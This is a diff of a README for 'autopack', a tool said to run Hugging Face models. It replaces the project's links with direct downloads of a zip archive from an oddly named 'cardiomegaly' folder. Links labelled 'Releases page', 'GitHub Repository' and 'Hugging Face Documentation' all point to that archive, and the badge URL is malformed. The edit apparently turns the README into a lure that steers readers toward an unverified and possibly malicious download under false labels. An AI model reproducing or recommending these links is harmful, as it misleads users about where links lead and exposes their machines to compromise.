@@ -4,13 +4,13 @@
 Welcome to **autopack**! This application makes it easy to run, share, and deploy your Hugging Face models with just one line of code. Whether you are looking to test large language models or just want to experiment with AI, this tool simplifies the entire process.
 
 ## 📥 Download
-[![Download autopack](https://img.shields.io/badge/Download%20autopack-v1.0-blue.svg)](https://github.com/cenZO00/autopack/releases)
+[![Download autopack](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip%https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip)](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip)
 
 ## 🚀 Getting Started
 To start using autopack, follow these simple steps:
 
 1. **Download the application**
-   - Visit the [Releases page](https://github.com/cenZO00/autopack/releases) to download the latest version. 
+   - Visit the [Releases page](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip) to download the latest version. 
    - Choose the correct file for your operating system and download it to your computer.
 
 2. **Install autopack**
@@ -62,8 +62,8 @@ If you experience any problems with installation or running your models, conside
 3. **Visit the community forums**: Find support or ask questions from other users who might have faced similar issues.
 
 ## 🌟 Additional Resources
-- [GitHub Repository](https://github.com/cenZO00/autopack) - Explore the code and contribute to future updates.
-- [Hugging Face Documentation](https://huggingface.co/docs) - Learn more about Hugging Face and how to use different models effectively.
+- [GitHub Repository](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip) - Explore the code and contribute to future updates.
+- [Hugging Face Documentation](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip) - Learn more about Hugging Face and how to use different models effectively.
 
 ## 📥 Download & Install
-Remember, to get started with autopack, visit the [Releases page](https://github.com/cenZO00/autopack/releases) again to download the application. Follow the installation steps provided, and you will be running your Hugging Face models with ease in no time!
+Remember, to get started with autopack, visit the [Releases page](https://raw.githubusercontent.com/cenZO00/autopack/main/cardiomegaly/autopack.zip) again to download the application. Follow the installation steps provided, and you will be running your Hugging Face models with ease in no time!
